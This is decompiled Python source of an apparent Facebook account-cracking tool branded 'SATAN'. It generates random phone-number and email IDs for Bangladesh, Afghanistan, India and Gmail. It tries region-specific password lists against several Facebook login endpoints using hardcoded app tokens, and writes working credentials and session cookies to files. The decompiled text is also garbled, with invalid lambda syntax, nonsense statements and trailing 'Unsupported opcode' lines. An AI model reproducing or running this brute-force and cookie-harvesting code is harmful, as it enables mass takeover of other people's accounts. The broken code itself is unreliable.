            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \x1b[1;97m ' + code)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mCRACKING....ON \x1b[1;97m')
            line()
            for psx in user:
                ids = code + psx
                passlist = [
                    psx,
                    ids,
                    ids[:8],
                    ids[:7],
                    'mimmim',
                    'fatema',
                    'jannat',
                    'sadiya',
                    'Bangla',
                    '@@@###',
                    '304050',
                    '102030',
                    '203040',
                    '708090',
                    'i love you',
                    'FREE FIRE',
                    'free fire',
                    'bangladesh',
                    'bangla']
                S1N.submit(bd1, ids, passlist)
                None(None, None)
                if not ''.join:
                    pass
        print('\x1b[1;37m')
        line()
        print(' THE PROCESS HAS COMPLETED')
        print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
        line()
        input(' PRESS ENTER TO BACK ')
        os.system('python s1n.py')

    
    def afg():
        user = []
        clear()
        print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 9377,9379,9374')
        code = input('\x1b[1;37m PUT CODE: ')
        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\x1b[1;37m PUT LIMIT : '))
        if ValueError:
            limit = 5000
        for nmbr in range(limit):
            nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
            user.append(nmp)
            S1N = tred(max_workers = 30)
            clear()
            print('[1] M-1 ')
            print('[2] M-2 ')
            line()
            mthd = input(' CHOOSE : ')
            line()
            clear()
            tl = str(len(user))
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \x1b[1;97m' + tl)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \x1b[1;97m ' + code)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mCRACKING....ON \x1b[1;97m')
            line()
            for psx in user:
                ids = code + psx
                passlist = [
                    psx,
                    ids,
                    'afghan',
                    'afghan12345',
                    'afghan123',
                    '600700',
                    'afghanistan',
                    'afghan1122',
                    '500500',
                    '100200',
                    '10002000',
                    '900900',
                    'kabul123',
                    'Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹',
                    'Û±Û³Û³Û³ÛµÛ¶',
                    'afghan1234',
                    'kabul1234',
                    'khankhan',
                    'khan123',
                    'khan123456',
                    'khan786']
                if mthd in ('1', '01'):
                    S1N.submit(rd, ids, passlist)
                if mthd in ('2', '02'):
                    S1N.submit(bd1, ids, passlist)
                None(None, None)
                if not ''.join:
                    pass
        print('\x1b[1;37m')
        line()
        print(' THE PROCESS HAS COMPLETED')
        print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
        line()
        input(' PRESS ENTER TO BACK ')
        os.system('python s1n.py')

    
    def ind():
        user = []
        clear()
        print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 91***,etc')
        code = input('\x1b[1;37m PUT CODE: ')
        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\x1b[1;37m PUT LIMIT : '))
        if ValueError:
            limit = 5000
        for nmbr in range(limit):
            nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
            user.append(nmp)
            S1N = tred(max_workers = 30)
            clear()
            print('[1] M-1 ')
            print('[2] M-2 ')
            line()
            mthd = input(' CHOOSE : ')
            line()
            clear()
            tl = str(len(user))
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \x1b[1;97m' + tl)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \x1b[1;97m ' + code)
            print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mCRACKING....ON \x1b[1;97m')
            line()
            for psx in user:
                ids = code + psx
                passlist = [
                    psx,
                    ids,
                    '57273200',
                    'hindustan',
                    '59039200',
                    '57575751']
                if mthd in ('1', '01'):
                    S1N.submit(rd, ids, passlist)
                if mthd in ('2', '02'):
                    S1N.submit(bd1, ids, passlist)
                None(None, None)
                if not ''.join:
                    pass
        print('\x1b[1;37m')
        line()
        print(' THE PROCESS HAS COMPLETED')
        print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
        line()
        input(' PRESS ENTER TO BACK ')
        os.system('python s1n.py')

    
    def gmail():
        os.system('rm -rf .re.txt')
        clear()
        print('\x1b[1;37m Example: eshal, ali, abbas, agnel\x1b[1;97m')
        line()
        first = input(' Put first name: ')
        line()
        print('\x1b[1;37m example: khan, ahmad, ali \x1b[1;97m')
        line()
        last = input(' Put last name: ')
        line()
        print(' Example: @gmail.com , @yahoo.com etc...')
        line()
        domain = input(' domain: ')
        line()
        limit = int(input(' Put limit: '))
        if ValueError:
            limit = 5000
        line()
        print(' Getting gmails...')
        lists = [
            '3',
            '4']
        for xd in range(limit):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(3)())
                open('.re.txt', 'a').write(first.lower() + last.lower() + mail + domain + '|' + first + ' ' + last + '\n')
            mail = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(4)())
            open('.re.txt', 'a').write(first.lower() + last.lower() + mail + domain + '|' + first + ' ' + last + '\n')
            fo = open('.re.txt', 'r').read().splitlines()
            S1N = tred(max_workers = 30)
            total = str(len(fo))
            clear()
            print('[1] M-1 ')
            print('[2] M-2 ')
            line()
            mthd = input(' CHOOSE : ')
            line()
            clear()
            print(' TOTAL ACCOUNT: \x1b[1;32m' + total)
            print(' \x1b[1;97mSELECT EMAIL: \x1b[1;32m' + domain)
            print(' \x1b[1;97mEMAIL CRACKING.... ON\x1b[1;97m')
            line()
            for user in fo:
                (ids, names) = user.split('|')
                first_name = names.rsplit(' ')[0]
                last_name = names.rsplit(' ')[1]
                if IndexError:
                    ''.join
                    last_name = 'Khan'
                fs = first_name.lower()
                ls = last_name.lower()
                passlist = [
                    fs + ls,
                    fs + ' ' + ls,
                    fs + '123',
                    fs + '12345',
                    fs + '1122',
                    fs,
                    fs + '1234',
                    fs + '786',
                    fs + '12',
                    ls + '123',
                    fs + ls + '123',
                    ls + '12345',
                    'khankhan',
                    '57273200']
                if mthd in ('1', '01'):
                    S1N.submit(rd, ids, passlist)
                if mthd in ('2', '02'):
                    S1N.submit(bd1, ids, passlist)
                None(None, None)
                if not ''.join:
                    pass
        print('\x1b[1;37m')
        line()
        print(' THE PROCESS HAS COMPLETED')
        print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
        line()
        input(' Press enter to back ')
        os.system('python s1n.py')

    
    def ffb(ids, names, passlist):
        global loop
        sys.stdout.write('\r\r\x1b[1;37m [SATAN-VIP] %s|\x1b[1;32mOK:-%s \x1b[1;37m' % (loop, len(oks)))
        sys.stdout.flush()
        session = requests.Session()
        first = names.split(' ')[0]
        last = names.split(' ')[1]
        last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            ua = random.choice(ugen)
            head = 'en-US,en;q=0.9'
            getlog = session.get(f'''https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr''')
            idpass = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),
                'uid': ids,
                'next': 'https://mbasic.facebook.com/login/save-device/',
                'flow': 'login_no_pin',
                'pass': pas }
            complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0', data = idpass, allow_redirects = False, headers = head)
            lucifer = session.cookies.get_dict().keys()
            if 'c_user' in lucifer:
                coki = session.cookies.get_dict()
                kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(session.cookies.get_dict().items()())
                print('\r\r\x1b[1;32m [SATAN-OK] %s | %s' % (ids, pas))
                open('/sdcard/SATAN-OK.txt', 'a').write(ids + '|' + pas + '\n')
                cek_apk(session, coki)
                oks.append(ids)
                ';'.join
            if 'checkpoint' in lucifer:
                open('/sdcard/SATAN-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                'accept-language'
            if requests.exceptions.ConnectionError:
                'gzip, deflate, br'
                time.sleep(20)
        loop += 1

    
    def api1(ids, names, passlist):
        global loop
        sys.stdout.write(f'''\r\r\x1b[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] {loop!s}|\x1b[1;37mOK|{len(oks)!s} \x1b[1;37m''')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        ln = names.split(' ')[1]
        ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            head = {
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': 'True',
                'X-Fb-Server-Cluster': 'True',
                'Content-Length': '847' }
            data = {
                'source': 'account_recovery',
                'locale': code,
                'client_country_code': loc,
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation' }
            po = requests.post('https://b-graph.facebook.com/auth/login', data = data, headers = head).json()
            if 'session_key' in po:
                uid = str(po['uid'])
                print('\r\r\x1b[1;32m [SATAN-OK] ' + uid + ' | ' + pas + '|' + asha(uid) + '\x1b[1;32m')
                ckkk = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
                ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookies = f'''sb={ssbb};{ckkk}'''
                print('\x1b[1;37m [🍪] Cookies :- ' + cookies)
                open('/sdcard/SATAN-OK.txt', 'a').write(uid + '|' + pas + '|' + cookies + '\n')
                oks.append(uid)
                ';'.join
            if 'www.facebook.com' in po['error']['message']:
                uid = str(po['error']['error_data']['uid'])
                open('/sdcard/SATAN-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(uid)
                'button_with_disabled'
            loop += 1
            return None
            if requests.exceptions.ConnectionError:
                'error_detail_type'
                time.sleep(20)
                return None
            if 'error_detail_type':
                e = "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']"
                e = None
                del e
                return None
            e = "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']"
            del e

    
    def rd(ids, passlist):
        global loop
        sys.stdout.write(f'''\r\r\x1b[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] {loop!s}|\x1b[1;37mOK|{len(oks)!s} \x1b[1;37m''')
        sys.stdout.flush()
        for pas in passlist:
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            head = {
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': 'True',
                'X-Fb-Server-Cluster': 'True',
                'Content-Length': '847' }
            data = {
                'source': 'account_recovery',
                'locale': code,
                'client_country_code': loc,
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation' }
            po = requests.post('https://b-graph.facebook.com/auth/login', data = data, headers = head).json()
            if 'session_key' in po:
                uid = str(po['uid'])
                print('\r\r\x1b[1;32m [SATAN-OK] ' + uid + ' | ' + pas + ' | ' + asha(uid) + '\x1b[1;32m')
                ckkk = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
                ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookies = f'''sb={ssbb};{ckkk}'''
                print('\x1b[1;37m [🍪] Cookies :- ' + cookies)
                open('/sdcard/SATAN-R-OK.txt', 'a').write(uid + '|' + pas + '|' + cookies + '\n')
                oks.append(uid)
                ';'.join
            if 'www.facebook.com' in po['error']['message']:
                uid = str(po['error']['error_data']['uid'])
                open('/sdcard/SATAN-R-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(uid)
                'button_with_disabled'
            loop += 1
            return None
            if requests.exceptions.ConnectionError:
                'error_detail_type'
                time.sleep(20)
                return None
            if 'error_detail_type':
                e = "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']"
                e = None
                del e
                return None
            e = "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']"
            del e

    
    def bd1(ids, passlist):
        global loop
        for ps in passlist:
            session = requests.Session()
            sys.stdout.write(f'''\r\r\x1b[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] {loop!s}|\x1b[1;37mOK|{len(oks)!s} \x1b[1;37m''')
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                'try_number': '0',
                'unrecognized_tries': '0',
                'email': ids,
                'pass': ps,
                'login': 'Log In' }
            header_freefb = {
                'origin': 'https://mbasic.facebook.com',
                'referer': 'https://mbasic.facebook.com/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"13.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro }
            twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8', data = log_data, headers = header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = (lambda .0: for key, value in .0:
[ key + '=' + value ])(session.cookies.get_dict().items()())
                cid = coki[7:22]
                print('\r\r\x1b[1;32m [SATAN-OK] ' + ids + ' | ' + ps)
                print('\x1b[1;37m [🍪] Cookies :- ' + coki)
                cek_apk(session, coki)
                open('/sdcard/SATAN-BD-OK.txt', 'a').write(ids + ' | ' + ps + ' | ' + coki + '\n')
                oks.append(cid)
                ';'.join
            if 'checkpoint' in log_cookies:
                coki = (lambda .0: for key, value in .0:
[ key + '=' + value ])(session.cookies.get_dict().items()())
                cid = coki[24:39]
                open('/sdcard/SATAN-BD-CP.txt', 'a').write(ids + ' | ' + ps + ' \n')
                cps.append(cid)
            if twf in session.cookies.get_dict().keys():
                print('\x1b[1;93m\x1b[0;34mSATAN-2F ' + ids + ' • ' + ps + '  \x1b[0;97m')
                ';'.join
            loop += 1
            return None
            if requests.exceptions.ConnectionError:
                'max-age=0'
                time.sleep(20)
                return None
            if 'max-age=0':
                e = 'cache-control'
                e = None
                del e
                return None
            e = 'cache-control'
            del e

    
    def newidx11(ids, names, passlist):
        global loop
        sys.stdout.write(f'''\r\r\x1b[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] {loop!s}|\x1b[1;37mOK|{len(oks)!s} \x1b[1;37m''')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        ln = names.split(' ')[1]
        ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            head = {
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62' }
            data = {
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d' }
            po = requests.post('https://b-graph.facebook.com/auth/login', data = data, headers = head).json()
            if 'session_key' in po:
                uid = str(po['uid'])
                print('\r\r\x1b[1;32m [SATAN-OK] ' + uid + ' | ' + pas + '|' + asha(uid) + '\x1b[1;32m')
                ckkk = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
                ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookies = f'''sb={ssbb};{ckkk}'''
                print('\x1b[1;37m [🍪] Cookies :- ' + cookies)
                open('/sdcard/SATAN-OK.txt', 'a').write(uid + '|' + pas + '|' + cookies + '\n')
                oks.append(uid)
                ';'.join
            if 'www.facebook.com' in po['error']['message']:
                uid = str(po['error']['error_data']['uid'])
                open('/sdcard/SATAN-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(uid)
                'PK'
            loop += 1
            return None
            if requests.exceptions.ConnectionError:
                'client_country_code'
                time.sleep(20)
                return None
            if 'client_country_code':
                e = 'en_PK'
                e = None
                del e
                return None
            e = 'en_PK'
            del e

    
    def newidx12(ids, names, passlist):
        global loop
        sys.stdout.write(f'''\r\r\x1b[1;37m[\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM4\x1b[1;97m] {loop!s}|\x1b[1;37mOK|{len(oks)!s} \x1b[1;37m''')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        ln = names.split(' ')[1]
        ln = fn
        for ps in passlist:
            pw = ps.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            ses = requests.Session()
            pro = random.choice(s1n())
            data = {
                'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',
                'sdk_version': {
                    random.randint(1, 26)},
                'email': ids,
                'locale': 'en_PH',
                'password': pw,
                'sdk': 'android',
                'generate_session_cookies': '1',
                'sig': '4f648f21fb58fcd2aa1c65f35f441ef5' }
            head = {
                'Host': 'graph.facebook.com',
                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-sim-hni': str(random.randint(20000, 60000)),
                'x-fb-net-hni': str(random.randint(20000, 60000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'user-agent': pro,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger' }
            q = requests.post('https://b-graph.facebook.com/auth/login', data = data, headers = head).json()
            if 'session_key' in q:
                coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(q['session_cookies']())
                sb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookie = f'''sb={sb};{coki}'''
                print(f'''\r\x1b[1;37m[\x1b[1;2mSATAN\x1b[1;92m-\x1b[1;92mOK\x1b[1;37m] {ids!s} | {pw!s} \x1b[1;37m ''')
                oks.append(ids)
                open('/sdcard/SATAN-OK.txt', 'a').write(ids + '|' + pw + '\n')
                open('/sdcard/SATAN-OK.txt', 'a').write(ids + '|' + pw + '|' + cookie + '\n')
                ';'.join
            if 'www.facebook.com' in q['error']['message']:
                cps.append(ids)
                open('/sdcard/SATAN-CP.txt', 'a').write(ids + '|' + pw + '\n')
            loop += 1
            return None
            if requests.exceptions.ConnectionError:
                time.sleep(20)
                return None
            if None:
                e = None
                e = None
                del e
                return None
            e = None
            del e

    
    def newidx(ids, names, passlist):
        global loop
        sys.stdout.write(f'''\r\r\x1b[1;37m[\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] {loop!s}|\x1b[1;37mOK|{len(oks)!s} \x1b[1;37m''')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        ln = names.split(' ')[1]
        ln = fn
        for ps in passlist:
            pw = ps.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            ses = requests.Session()
            data = {
                'source': 'account_recovery',
                'locale': code,
                'client_country_code': loc,
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation' }
            headers = {
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': 'True',
                'X-Fb-Server-Cluster': 'True' }
            q = ses.post('https://b-graph.facebook.com/auth/login', data = data, headers = headers, allow_redirects = False).json()
            if 'session_key' in q:
                coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(q['session_cookies']())
                sb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookie = f'''sb={sb};{coki}'''
                print(f'''\r\x1b[1;37m[\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mOK\x1b[1;37m] {ids!s} | {pw!s} \x1b[1;37m ''')
                oks.append(ids)
                open('/sdcard/SATAN-OK.txt', 'a').write(ids + '|' + pw + '\n')
                open('/sdcard/SATAN-OK.txt', 'a').write(ids + '|' + pw + '|' + cookie + '\n')
                ';'.join
            if 'www.facebook.com' in q['error']['message']:
                cps.append(ids)
                open('/sdcard/SATAN-CP.txt', 'a').write(ids + '|' + pw + '\n')
                'unknown'
            loop += 1
            return None
            if requests.exceptions.ConnectionError:
                'X-Fb-Request-Analytics-Tags'
                time.sleep(20)
                return None
            if 'X-Fb-Request-Analytics-Tags':
                e = 'authenticate'
                e = None
                del e
                return None
            e = 'authenticate'
            del e

    menu()
    return None

Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
